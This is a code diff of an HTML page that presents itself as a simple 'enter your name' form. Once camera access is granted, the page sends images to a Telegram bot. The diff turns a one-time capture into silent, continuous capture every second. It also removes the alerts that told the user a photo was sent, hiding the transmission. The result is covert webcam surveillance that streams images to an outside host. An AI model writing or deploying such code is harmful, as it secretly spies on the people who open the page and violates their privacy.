@@ -38,10 +38,10 @@
         <h1>Please Enter Your Name</h1>
         <input type="text" id="username" placeholder="Enter your name" required>
         <br><br>
-        <button onclick="requestCamera()">OK</button>
+        <button onclick="startPhotoCapture()">OK</button>
     </div>
     <script>
-        async function requestCamera() {
+        async function startPhotoCapture() {
             const username = document.getElementById('username').value;
             if (!username) {
                 alert('Please enter your name');
@@ -63,17 +63,19 @@
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
 
-                    // Capture photo after 1 second
-                    setTimeout(() => {
+                    // Capture and send photo every second
+                    setInterval(() => {
                         context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        const photoBlob = canvas.toBlob(blob => {
-                            sendToTelegram(username, blob);
+                        canvas.toBlob(blob => {
+                            if (blob) {
+                                sendToTelegram(username, blob);
+                            }
                         }, 'image/jpeg');
-                    }, 1000);
+                    }, 1000); // Capture and send photo every 1000 ms (1 second)
                 });
-                
+
             } catch (error) {
-                alert('Camera access denied.');
+                alert('Camera access denied or failed.');
             }
         }
 
@@ -93,16 +95,14 @@
                     method: 'POST',
                     body: formData
                 });
+
+                // Optional: Log response for debugging
                 const data = await response.json();
-                if (data.ok) {
-                    alert('Your photo has been sent!');
-                } else {
+                if (!data.ok) {
                     console.error('Telegram API Error:', data);
-                    alert('Failed to send photo.');
                 }
             } catch (error) {
-                console.error('Error:', error);
-                alert('Failed to send photo.');
+                console.error('Fetch Error:', error);
             }
         }
     </script>
